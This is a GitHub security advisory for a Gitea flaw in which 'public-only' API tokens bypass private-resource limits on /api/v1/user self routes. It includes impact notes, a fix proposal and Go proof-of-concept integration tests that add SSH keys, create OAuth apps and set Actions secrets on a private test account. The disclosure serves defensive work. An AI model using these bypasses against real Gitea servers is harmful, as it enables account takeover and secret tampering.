# [H] Gitea: Public-only tokens bypass private-resource restrictions on `/api/v1/user` self routes

## Summary
Severity: High
Advisory: GHSA-wrr5-99h5-gq57
CVE: CVE-2026-24791
CWE: CWE-863
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-06-17
Source: https://github.com/advisories/GHSA-wrr5-99h5-gq57
Type: github-advisory

## Affected
- Go: `code.gitea.io/gitea` — affected >=1.22.3 <1.26.2

## Details
## Summary

Many authenticated self routes under `/api/v1/user/...` do not enforce the `public-only` token restriction. As a result, a token or OAuth grant marked `public-only`, but otherwise carrying the route-required read/write scope category, can access or modify private account resources through self routes.

The canonical private-user endpoint correctly rejects the same tokens, for example `GET /api/v1/users/{privateUser}` returns `403`. The bypass exists because the generic `/api/v1/user` route group requires user scope and `reqToken()`, but does not enforce the token's public-only restriction for most self routes.

This is a systemic token/OAuth scope-boundary bypass, not a single endpoint bug.

This appears related to the previously fixed public-only token issue tracked as [CVE-2025-68941 / GHSA-xfq3-qj7j-4565](https://github.com/advisories/GHSA-xfq3-qj7j-4565), which affected Gitea `< 1.22.3`. The behavior described here reproduces on tested main checkout `6a2706626904`. A representative SSH-key self-route PoC also reproduces on tested releases through v1.26.1. In other words, this should be treated as an incomplete fix / residual gap in a different route family, not as a duplicate of the older advisory.

## Affected Code

The generic `/api/v1/user` group is mounted with user scope and `reqToken()`:

- `routers/api/v1/api.go:1008-1128`

`tokenRequiresScopes()` sets `ctx.PublicOnly` when the token contains `public-only`, but the public-only restriction is enforced only by routes that also call `checkTokenPublicOnly()`:

- `routers/api/v1/api.go:241-294` implements `checkTokenPublicOnly()`.
- `routers/api/v1/api.go:299-341` sets `ctx.PublicOnly` from the token scope.

Representative affected routes in that group:

- `/api/v1/user`: private self profile and settings.
- `/api/v1/user/emails`: read, add, and delete account email addresses.
- `/api/v1/user/keys`: list and add SSH public keys.
- `/api/v1/user/applications/oauth2`: list and create OAuth2 applications, including returned client secrets.
- `/api/v1/user/actions/secrets/{secretname}`: create or delete user-level Actions secrets.
- `/api/v1/user/actions/variables`: list, read, create, update, and delete user-level Actions variables.
- `/api/v1/user/actions/runners/...`: list, update, delete runners, and mint registration tokens.
- `/api/v1/user/actions/runs` and `/api/v1/user/actions/jobs`: list workflow metadata for private repositories.
- `/api/v1/user/repos`: create private repositories and list private repositories.
- `/api/v1/user/subscriptions`, `/api/v1/user/times`, `/api/v1/user/stopwatches`, `/api/v1/user/teams`, `/api/v1/user/hooks`: leak or modify private-account resources.

Correct public-only enforcement for comparison:

- `routers/api/v1/api.go:970-1008` applies `context.UserAssignmentAPI()` and `checkTokenPublicOnly()` to canonical `/api/v1/users/{username}` routes.
- `routers/api/v1/user/user.go:122-125` rejects public-only access to private users on `/api/v1/users/{username}`.
- `routers/api/v1/api.go:1091-1092` shows that `/api/v1/user/repos` requires the additional repository scope category, but still does not apply `checkTokenPublicOnly()`.

## Local PoCs

The following dynamic PoCs were retested on checkout `6a2706626904` and all reproduced successfully. Each PoC writes a temporary integration test, runs it, and removes it afterward.

```bash
cd pocs
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_self_user_private_profile_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_ssh_key_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_emails_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_oauth_app_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_repos_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_actions_secret_variable_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_runner_registration_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_runner_manage_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_webhook_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_actions_runs_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_actions_jobs_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_subscriptions_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_times_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_stopwatches_private_repo_bypass_dynamic_poc.go
GITEA_REPO=/path/to/gitea-checkout GOTOOLCHAIN=auto go run ./api_public_only_user_teams_private_org_bypass_dynamic_poc.go
```

## Reproduced Impact Examples

Using private fixture user `user31`, public-only tokens are rejected by `GET /api/v1/users/user31`, but tokens with the route-required scopes can still reach the self routes below.

Confirmed with `public-only,write:user`:

- add SSH keys through `/api/v1/user/keys`;
- add account emails through `/api/v1/user/emails`;
- create OAuth2 applications and receive `client_secret` through `/api/v1/user/applications/oauth2`;
- create/delete user-level Actions secrets;
- create/read/list/update/delete user-level Actions variables;
- mint user-level runner registration tokens;
- manage user-level runners;
- create user webhooks.

Confirmed with `public-only,read:user`:

- read private self profile/settings and account email surfaces;
- list OAuth2 applications and user webhooks;
- list private repository workflow runs/jobs exposed through self Actions routes;
- list private subscriptions, tracked times, stopwatches, and team memberships.

Confirmed with `public-only` plus the route-required repository category:

- create private repositories through `POST /api/v1/user/repos` with `public-only,write:user,write:repository`;
- list those private repositories through `GET /api/v1/user/repos` with `public-only,read:user,read:repository`, while the canonical private repository endpoint remains forbidden.

## Impact

The `public-only` token flag is intended to limit a token or OAuth grant to public resources. These routes violate that boundary for private accounts.

Practical abuse scenarios include:

- a third-party app or leaked token with the route-required write scope, but restricted to public resources, adding SSH credentials or OAuth applications to a private account;
- a public-resource-restricted token with the route-required write scope modifying Actions secrets/variables or registering/managing runners;
- a token limited to public resources creating and enumerating private repositories;
- a supposedly public-only integration learning private repository, workflow, team, timing, subscription, webhook, and email metadata.

## Suggested Fix

Apply public-only enforcement consistently to self routes under `/api/v1/user`.

At minimum:

- for self routes, treat `ctx.Doer` as the target user/resource owner when enforcing `public-only`; mechanically adding `checkTokenPublicOnly()` is not sufficient unless `ctx.ContextUser` is set to `ctx.Doer` or the check explicitly handles self routes;
- reject `ctx.PublicOnly` on credential, identity, OAuth application, repository creation, webhook, Actions, runner, and email-management self-route mutations;
- filter list routes so public-only tokens cannot return private repositories, private organization/team metadata, private workflow runs/jobs, private tracked time, private stopwatches, or hidden subscriptions;
- add regression coverage that compares each affected `/api/v1/user/...` route against the canonical private-user or private-repository endpoint.

Non-public-only tokens should preserve current behavior.

---

## Attachment: `api_public_only_user_ssh_key_bypass_dynamic_poc.go`

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
)

const testSource = `// PoC test for private security report.
// SPDX-License-Identifier: MIT

package integration

import (
        "net/http"
        "testing"

        asymkey_model "code.gitea.io/gitea/models/asymkey"
        auth_model "code.gitea.io/gitea/models/auth"
        "code.gitea.io/gitea/models/unittest"
        user_model "code.gitea.io/gitea/models/user"
        api "code.gitea.io/gitea/modules/structs"
        "code.gitea.io/gitea/tests"

        "github.com/stretchr/testify/require"
)

func TestAPIPublicOnlyUserSSHKeyBypass(t *testing.T) {
        defer tests.PrepareTestEnv(t)()

        privateUser := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user31"})
        require.True(t, privateUser.Visibility.IsPrivate())

        session := loginUser(t, privateUser.Name)
        publicOnlyWriteUserToken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopePublicOnly, auth_model.AccessTokenScopeWriteUser)

        MakeRequest(t, NewRequest(t, "GET", "/api/v1/users/user31").AddTokenAuth(publicOnlyWriteUserToken), http.StatusForbidden)

        req := NewRequestWithJSON(t, "POST", "/api/v1/user/keys", api.CreateKeyOption{
                Title: "public-only-private-key-bypass",
                Key:   "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4cn+iXnA4KvcQYSV88vGn0Yi91vG47t1P7okprVmhNTkipNRIHWr6WdCO4VDr/cvsRkuVJAsLO2enwjGWWueOO6BodiBgyAOZ/5t5nJNMCNuLGT5UIo/RI1b0WRQwxEZTRjt6mFNw6lH14wRd8ulsr9toSWBPMOGWoYs1PDeDL0JuTjL+tr1SZi/EyxCngpYszKdXllJEHyI79KQgeD0Vt3pTrkbNVTOEcCNqZePSVmUH8X8Vhugz3bnE0/iE9Pb5fkWO9c4AnM1FgI/8Bvp27Fw2ShryIXuR6kKvUqhVMTuOSDHwu6A8jLE5Owt3GAYugDpDYuwTVNGrHLXKpPzrGGPE/jPmaLCMZcsdkec95dYeU3zKODEm8UQZFhmJmDeWVJ36nGrGZHL4J5aTTaeFUJmmXDaJYiJ+K2/ioKgXqnXvltu0A9R8/LGy4nrTJRr4JMLuJFoUXvGm1gXQ70w2LSpk6yl71RNC0hCtsBe8BP8IhYCM0EP5jh7eCMQZNvM= nocomment",
        }).AddTokenAuth(publicOnlyWriteUserToken)
        resp := MakeRequest(t, req, http.StatusCreated)
        key := DecodeJSON(t, resp, &api.PublicKey{})
        require.Equal(t, "public-only-private-key-bypass", key.Title)

        unittest.AssertExistsAndLoadBean(t, &asymkey_model.PublicKey{
                ID:      key.ID,
                OwnerID: privateUser.ID,
                Name:    "public-only-private-key-bypass",
        })

        req = NewRequest(t, "GET", "/api/v1/user/keys").AddTokenAuth(publicOnlyWriteUserToken)
        resp = MakeRequest(t, req, http.StatusOK)
        keys := DecodeJSON(t, resp, []api.PublicKey{})
        found := false
        for _, k := range keys {
                if k.ID == key.ID {
                        found = true
                        break
                }
        }
        require.True(t, found)
}
`

func repoPath() string {
        candidates := []string{}
        if repo := os.Getenv("GITEA_REPO"); repo != "" {
                candidates = append(candidates, repo)
        }
        candidates = append(candidates, "../repo", "../../gitea/repo", "../../gitea")

        for _, candidate := range candidates {
                if _, err := os.Stat(filepath.Join(candidate, "routers/api/v1/user/key.go")); err == nil {
                        return filepath.Clean(candidate)
                }
        }
        fmt.Fprintf(os.Stderr, "could not locate Gitea checkout; tried: %s\n", strings.Join(candidates, ", "))
        os.Exit(2)
        return ""
}

func main() {
        repo := repoPath()
        testPath := filepath.Join(repo, "tests/integration/api_public_only_user_ssh_key_bypass_dynamic_poc_test.go")
        if err := os.WriteFile(testPath, []byte(testSource), 0o644); err != nil {
                fmt.Fprintf(os.Stderr, "write temp test: %v\n", err)
                os.Exit(2)
        }
        defer func() {
                if err := os.Remove(testPath); err != nil && !os.IsNotExist(err) {
                        fmt.Fprintf(os.Stderr, "warning: remove temp test: %v\n", err)
                }
        }()

        cmd := exec.Command("go", "test", "-timeout", "40m", "-run", "TestAPIPublicOnlyUserSSHKeyBypass", "code.gitea.io/gitea/tests/integration")
        cmd.Dir = repo
        cmd.Env = append(os.Environ(), "SNAP=1", "SNAP_NAME=gitea-test", "GOTOOLCHAIN=auto")
        out, err := cmd.CombinedOutput()
        fmt.Printf("source=%s\n", repo)
        fmt.Print(string(out))
        if err != nil {
                fmt.Fprintf(os.Stderr, "not reproduced: go test failed: %v\n", err)
                os.Exit(1)
        }
        fmt.Println("reproduced: public-only,write:user is rejected on the canonical private /users/{username} endpoint")
        fmt.Println("reproduced: the same public-only token with the route-required write:user scope can add an SSH public key to the private account through /api/v1/user/keys")
        fmt.Println("reproduced: the same token can list that newly added key through /api/v1/user/keys")
        fmt.Println("condition=private user issues a public-only,write:user token")
        fmt.Println("cvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N")
}

```

---

## Attachment: `api_public_only_user_oauth_app_bypass_dynamic_poc.go`

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
)

const testSource = `// PoC test for private security report.
// SPDX-License-Identifier: MIT

package integration

import (
        "net/http"
        "testing"

        auth_model "code.gitea.io/gitea/models/auth"
        "code.gitea.io/gitea/models/unittest"
        user_model "code.gitea.io/gitea/models/user"
        api "code.gitea.io/gitea/modules/structs"
        "code.gitea.io/gitea/tests"

        "github.com/stretchr/testify/require"
)

func TestAPIPublicOnlyUserOAuthAppBypass(t *testing.T) {
        defer tests.PrepareTestEnv(t)()

        privateUser := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user31"})
        require.True(t, privateUser.Visibility.IsPrivate())

        session := loginUser(t, privateUser.Name)
        publicOnlyWriteUserToken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopePublicOnly, auth_model.AccessTokenScopeWriteUser)
        publicOnlyReadUserToken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopePublicOnly, auth_model.AccessTokenScopeReadUser)

        MakeRequest(t, NewRequest(t, "GET", "/api/v1/users/user31").AddTokenAuth(publicOnlyReadUserToken), http.StatusForbidden)

        req := NewRequestWithJSON(t, "POST", "/api/v1/user/applications/oauth2", &api.CreateOAuth2ApplicationOptions{
                Name:               "public-only-private-oauth-app",
                RedirectURIs:       []string{"https://example.com/callback"},
                ConfidentialClient: true,
        }).AddTokenAuth(publicOnlyWriteUserToken)
        resp := MakeRequest(t, req, http.StatusCreated)
        app := DecodeJSON(t, resp, &api.OAuth2Application{})
        require.Equal(t, "public-only-private-oauth-app", app.Name)
        require.NotEmpty(t, app.ClientID)
        require.NotEmpty(t, app.ClientSecret)

        req = NewRequest(t, "GET", "/api/v1/user/applications/oauth2").AddTokenAuth(publicOnlyReadUserToken)
        resp = MakeRequest(t, req, http.StatusOK)
        apps := DecodeJSON(t, resp, api.OAuth2ApplicationList{})
        found := false
        for _, a := range apps {
                if a.ID == app.ID && a.Name == app.Name {
                        found = true
                        break
                }
        }
        require.True(t, found)
}
`

func repoPath() string {
        candidates := []string{}
        if repo := os.Getenv("GITEA_REPO"); repo != "" {
                candidates = append(candidates, repo)
        }
        candidates = append(candidates, "../repo", "../../gitea/repo", "../../gitea")

        for _, candidate := range candidates {
                if _, err := os.Stat(filepath.Join(candidate, "routers/api/v1/user/app.go")); err == nil {
                        return filepath.Clean(candidate)
                }
        }
        fmt.Fprintf(os.Stderr, "could not locate Gitea checkout; tried: %s\n", strings.Join(candidates, ", "))
        os.Exit(2)
        return ""
}

func main() {
        repo := repoPath()
        testPath := filepath.Join(repo, "tests/integration/api_public_only_user_oauth_app_bypass_dynamic_poc_test.go")
        if err := os.WriteFile(testPath, []byte(testSource), 0o644); err != nil {
                fmt.Fprintf(os.Stderr, "write temp test: %v\n", err)
                os.Exit(2)
        }
        defer func() {
                if err := os.Remove(testPath); err != nil && !os.IsNotExist(err) {
                        fmt.Fprintf(os.Stderr, "warning: remove temp test: %v\n", err)
                }
        }()

        cmd := exec.Command("go", "test", "-timeout", "40m", "-run", "TestAPIPublicOnlyUserOAuthAppBypass", "code.gitea.io/gitea/tests/integration")
        cmd.Dir = repo
        cmd.Env = append(os.Environ(), "SNAP=1", "SNAP_NAME=gitea-test", "GOTOOLCHAIN=auto")
        out, err := cmd.CombinedOutput()
        fmt.Printf("source=%s\n", repo)
        fmt.Print(string(out))
        if err != nil {
                fmt.Fprintf(os.Stderr, "not reproduced: go test failed: %v\n", err)
                os.Exit(1)
        }
        fmt.Println("reproduced: public-only user-scoped tokens are rejected on the canonical private /users/{username} endpoint")
        fmt.Println("reproduced: public-only,write:user can create an OAuth2 application for the private account and receives a client secret")
        fmt.Println("reproduced: public-only,read:user can list that OAuth2 application through /api/v1/user/applications/oauth2")
        fmt.Println("condition=private user issues public-only tokens with route-required user scopes")
        fmt.Println("cvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N")
}

```

---

## Attachment: `api_public_only_user_repos_private_repo_bypass_dynamic_poc.go`

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
)

const testSource = `// PoC test for private security report.
// SPDX-License-Identifier: MIT

package integration

import (
        "net/http"
        "testing"

        auth_model "code.gitea.io/gitea/models/auth"
        "code.gitea.io/gitea/models/unittest"
        user_model "code.gitea.io/gitea/models/user"
        api "code.gitea.io/gitea/modules/structs"
        "code.gitea.io/gitea/tests"

        "github.com/stretchr/testify/require"
)

func TestAPIPublicOnlyUserReposBypass(t *testing.T) {
        defer tests.PrepareTestEnv(t)()

        privateUser := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user31"})
        require.True(t, privateUser.Visibility.IsPrivate())

        session := loginUser(t, privateUser.Name)
        publicOnlyReadRepoToken := getTokenForLoggedInUser(t, session,
                auth_model.AccessTokenScopePublicOnly,
                auth_model.AccessTokenScopeReadUser,
                auth_model.AccessTokenScopeReadRepository,
        )
        publicOnlyWriteRepoToken := getTokenForLoggedInUser(t, session,
                auth_model.AccessTokenScopePublicOnly,
                auth_model.AccessTokenScopeWriteUser,
                auth_model.AccessTokenScopeWriteRepository,
        )

        req := NewRequestWithJSON(t, "POST", "/api/v1/user/repos", &api.CreateRepoOption{
                Name:    "public-only-private-repo",
                Private: true,
        }).AddTokenAuth(publicOnlyWriteRepoToken)
        resp := MakeRequest(t, req, http.StatusCreated)
        created := DecodeJSON(t, resp, &api.Repository{})
        require.Equal(t, "user31/public-only-private-repo", created.FullName)
        require.True(t, created.Private)

        MakeRequest(t, NewRequest(t, "GET", "/api/v1/repos/user31/public-only-private-repo").AddTokenAuth(publicOnlyReadRepoToken), http.StatusForbidden)

        resp = MakeRequest(t, NewRequest(t, "GET", "/api/v1/user/repos").AddTokenAuth(publicOnlyReadRepoToken), http.StatusOK)
        repos := DecodeJSON(t, resp, []api.Repository{})
        found := false
        for _, repo := range repos {
                if repo.FullName == "user31/public-only-private-repo" {
                        found = true
                        require.True(t, repo.Private)
                }
        }
        require.True(t, found)
}
`

func repoPath() string {
        candidates := []string{}
        if repo := os.Getenv("GITEA_REPO"); repo != "" {
                candidates = append(candidates, repo)
        }
        candidates = append(candidates, "../repo", "../../gitea/repo", "../../gitea")

        for _, candidate := range candidates {
                if _, err := os.Stat(filepath.Join(candidate, "routers/api/v1/user/repo.go")); err == nil {
                        return filepath.Clean(candidate)
                }
        }
        fmt.Fprintf(os.Stderr, "could not locate Gitea checkout; tried: %s\n", strings.Join(candidates, ", "))
        os.Exit(2)
        return ""
}

func main() {
        repo := repoPath()
        testPath := filepath.Join(repo, "tests/integration/api_public_only_user_repos_private_repo_bypass_dynamic_poc_test.go")
        if err := os.WriteFile(testPath, []byte(testSource), 0o644); err != nil {
                fmt.Fprintf(os.Stderr, "write temp test: %v\n", err)
                os.Exit(2)
        }
        defer func() {
                if err := os.Remove(testPath); err != nil && !os.IsNotExist(err) {
                        fmt.Fprintf(os.Stderr, "warning: remove temp test: %v\n", err)
                }
        }()

        cmd := exec.Command("go", "test", "-timeout", "40m", "-run", "TestAPIPublicOnlyUserReposBypass", "code.gitea.io/gitea/tests/integration")
        cmd.Dir = repo
        cmd.Env = append(os.Environ(), "SNAP=1", "SNAP_NAME=gitea-test", "GOTOOLCHAIN=auto")
        out, err := cmd.CombinedOutput()
        fmt.Printf("source=%s\n", repo)
        fmt.Print(string(out))
        if err != nil {
                fmt.Fprintf(os.Stderr, "not reproduced: go test failed: %v\n", err)
                os.Exit(1)
        }
        fmt.Println("reproduced: public-only,write:user,write:repository can create a private repository through /api/v1/user/repos")
        fmt.Println("reproduced: public-only,read:user,read:repository is still forbidden on the canonical repository endpoint for that repo")
        fmt.Println("reproduced: the same public-only token with the route-required read:user,read:repository scope can list the private repository through /api/v1/user/repos")
        fmt.Println("condition=private user issues public-only tokens with route-required user and repository scopes")
        fmt.Println("cvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N")
}

```

---

## Attachment: `api_public_only_user_actions_secret_variable_bypass_dynamic_poc.go`

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
)

const testSource = `// PoC test for private security report.
// SPDX-License-Identifier: MIT

package integration

import (
        "net/http"
        "testing"

        auth_model "code.gitea.io/gitea/models/auth"
        "code.gitea.io/gitea/models/unittest"
        user_model "code.gitea.io/gitea/models/user"
        api "code.gitea.io/gitea/modules/structs"
        "code.gitea.io/gitea/tests"

        "github.com/stretchr/testify/require"
)

func TestAPIPublicOnlyUserActionsSecretVariableBypass(t *testing.T) {
        defer tests.PrepareTestEnv(t)()

        privateUser := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user31"})
        require.True(t, privateUser.Visibility.IsPrivate())

        session := loginUser(t, privateUser.Name)
        publicOnlyWriteUserToken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopePublicOnly, auth_model.AccessTokenScopeWriteUser)

        MakeRequest(t, NewRequest(t, "GET", "/api/v1/users/user31").AddTokenAuth(publicOnlyWriteUserToken), http.StatusForbidden)

        req := NewRequestWithJSON(t, "PUT", "/api/v1/user/actions/secrets/PRIVATE_SECRET", api.CreateOrUpdateSecretOption{
                Data: "top-secret",
        }).AddTokenAuth(publicOnlyWriteUserToken)
        MakeRequest(t, req, http.StatusCreated)

        req = NewRequestWithJSON(t, "POST", "/api/v1/user/actions/variables/PRIVATE_VAR", api.CreateVariableOption{
                Value:       "private-value",
                Description: "scoped through public-only token",
        }).AddTokenAuth(publicOnlyWriteUserToken)
        MakeRequest(t, req, http.StatusCreated)

        req = NewRequest(t, "GET", "/api/v1/user/actions/variables/PRIVATE_VAR").AddTokenAuth(publicOnlyWriteUserToken)
        resp := MakeRequest(t, req, http.StatusOK)
        variable := DecodeJSON(t, resp, &api.ActionVariable{})
        require.Equal(t, "PRIVATE_VAR", variable.Name)
        require.Equal(t, "private-value", variable.Data)

        req = NewRequest(t, "GET", "/api/v1/user/actions/variables").AddTokenAuth(publicOnlyWriteUserToken)
        resp = MakeRequest(t, req, http.StatusOK)
        variables := DecodeJSON(t, resp, []*api.ActionVariable{})
        found := false
        for _, v := range variables {
                if v.Name == "PRIVATE_VAR" && v.Data == "private-value" {
                        found = true
                        break
                }
        }
        require.True(t, found)
}
`

func repoPath() string {
        candidates := []string{}
        if repo := os.Getenv("GITEA_REPO"); repo != "" {
                candidates = append(candidates, repo)
        }
        candidates = append(candidates, "../repo", "../../gitea/repo", "../../gitea")

        for _, candidate := range candidates {
                if _, err := os.Stat(filepath.Join(candidate, "routers/api/v1/user/action.go")); err == nil {
                        return filepath.Clean(candidate)
                }
        }
        fmt.Fprintf(os.Stderr, "could not locate Gitea checkout; tried: %s\n", strings.Join(candidates, ", "))
        os.Exit(2)
        return ""
}

func main() {
        repo := repoPath()
        testPath := filepath.Join(repo, "tests/integration/api_public_only_user_actions_secret_variable_bypass_dynamic_poc_test.go")
        if err := os.WriteFile(testPath, []byte(testSource), 0o644); err != nil {
                fmt.Fprintf(os.Stderr, "write temp test: %v\n", err)
                os.Exit(2)
        }
        defer func() {
                if err := os.Remove(testPath); err != nil && !os.IsNotExist(err) {
                        fmt.Fprintf(os.Stderr, "warning: remove temp test: %v\n", err)
                }
        }()

        cmd := exec.Command("go", "test", "-timeout", "40m", "-run", "TestAPIPublicOnlyUserActionsSecretVariableBypass", "code.gitea.io/gitea/tests/integration")
        cmd.Dir = repo
        cmd.Env = append(os.Environ(), "SNAP=1", "SNAP_NAME=gitea-test", "GOTOOLCHAIN=auto")
        out, err := cmd.CombinedOutput()
        fmt.Printf("source=%s\n", repo)
        fmt.Print(string(out))
        if err != nil {
                fmt.Fprintf(os.Stderr, "not reproduced: go test failed: %v\n", err)
                os.Exit(1)
        }
        fmt.Println("reproduced: public-only,write:user is rejected on the canonical private /users/{username} endpoint")
        fmt.Println("reproduced: the same public-only token with the route-required write:user scope can create a user actions secret for the private account")
        fmt.Println("reproduced: the same public-only token with the route-required write:user scope can create, read, and list user actions variables")
        fmt.Println("condition=private user issues a public-only,write:user token")
        fmt.Println("cvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N")
}

```

---

## Attachment: `api_public_only_user_runner_registration_bypass_dynamic_poc.go`

```go
package main

import (
        "fmt"
        "os"
        "os/exec"
        "path/filepath"
        "strings"
)

const testSource = `// PoC test for private security report.
// SPDX-License-Identifier: MIT

package integration

import (
        "net/http"
        "testing"

        auth_model "code.gitea.io/gitea/models/auth"
        "code.gitea.io/gitea/models/unittest"
        user_model "code.gitea.io/gitea/models/user"
        "code.gitea.io/gitea/tests"

        "github.com/stretchr/testify/require"
)

func TestAPIPublicOnlyUserRunnerRegistrationBypass(t *testing.T) {
        defer tests.PrepareTestEnv(t)()

        privateUser := unittest.AssertExistsAndLoadBean(t, &user_model.User{Name: "user31"})
        require.True(t, privateUser.Visibility.IsPrivate())

        session := loginUser(t, privateUser.Name)
        publicOnlyWriteUserToken := getTokenForLoggedInUser(t, session, auth_model.AccessTokenScopePublicOnly, auth_model.AccessTokenScopeWriteUser)

        MakeRequest(t, NewRequest(t, "GET", "/api/v1/users/user31").AddTokenAuth(publicOnlyWriteUserToken), http.StatusForbidden)

        resp := MakeRequest(t, NewRequest(t, "POST", "/api/v1/user/actions/runners/registration-token").AddTokenAuth(publicOnlyWriteUserToken), http.StatusOK)
        registrationToken := DecodeJSON(t, resp, &map[string]string{})
        require.NotEmpty(t, (*registrationToken)["token"])
}
`

func repoPath() string {
        candidates := []string{}
        if repo := os.Getenv("GITEA_REPO"); repo != "" {
                candidates = append(candidates, repo)
        }
        candidates = append(candidates, "../repo", "../../gitea/repo", "../../gitea")

        for _, candidate := range candidates {
                if _, err := os.Stat(filepath.Join(candidate, "routers/api/v1/user/runners.go")); err == nil {
                        return filepath.Clean(candidate)
                }
        }
        fmt.Fprintf(os.Stderr, "could not locate Gitea checkout; tried: %s\n", strings.Join(candidates, ", "))
        os.Exit(2)
        return ""
}

func main() {
        repo := repoPath()
        testPath := filepath.Join(repo, "tests/integration/api_public_only_user_runner_registration_bypass_dynamic_poc_test.go")
        if err := os.WriteFile(testPath, []byte(testSource), 0o644); err != nil {
                fmt.Fprintf(os.Stderr, "write temp test: %v\n", err)
                os.Exit(2)
        }
        defer func() {
                if err := os.Remove(testPath); err != nil && !os.IsNotExist(err) {
                        fmt.Fprintf(os.Stderr, "warning: remove temp test: %v\n", err)
                }
        }()

        cmd := exec.Command("go", "test", "-timeout", "40m", "-run", "TestAPIPublicOnlyUserRunnerRegistrationBypass", "code.gitea.io/gitea/tests/integration")
        cmd.Dir = repo
        cmd.Env = append(os.Environ(), "SNAP=1", "SNAP_NAME=gitea-test", "GOTOOLCHAIN=auto")
        out, err := cmd.CombinedOutput()
        fmt.Printf("source=%s\n", repo)
        fmt.Print(string(out))
        if err != nil {
                fmt.Fprintf(os.Stderr, "not reproduced: go test failed: %v\n", err)
                os.Exit(1)
        }
        fmt.Println("reproduced: public-only,write:user is rejected on the canonical private /users/{username} endpoint")
        fmt.Println("reproduced: the same public-only token with the route-required write:user scope can mint a user-level actions runner registration token")
        fmt.Println("condition=private user issues a public-only,write:user token")
        fmt.Println("cvss_candidate=CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N")
}

```

---

## Version validation

Validation date: 2026-05-13

The SSH-key write PoC was used as the representative dynamic test for the systemic `/api/v1/user` self-route public-only bypass.

| Version | Commit | Result |
|---|---:|---|
| main | `6a2706626904` | reproduced dynamically |
| v1.26.1 | `afdbd9b7c5` | reproduced dynamically |
| v1.25.5 | `f913d90ab6` | reproduced dynamically |
| v1.24.7 | `99053ce4fa` | reproduced dynamically |
| v1.23.8 | `cccd54999a` | reproduced dynamically |
| v1.22.6 | `8eefa1f6de` | reproduced dynamically with Go 1.22.12 test toolchain |

The representative version-matrix PoC validates the same root cause across tested releases for the SSH-key self-route write surface. The additional lead/supporting PoCs above were retested on the main checkout listed in the Local PoCs section.

## References
- https://github.com/go-gitea/gitea/security/advisories/GHSA-wrr5-99h5-gq57
- https://github.com/go-gitea/gitea
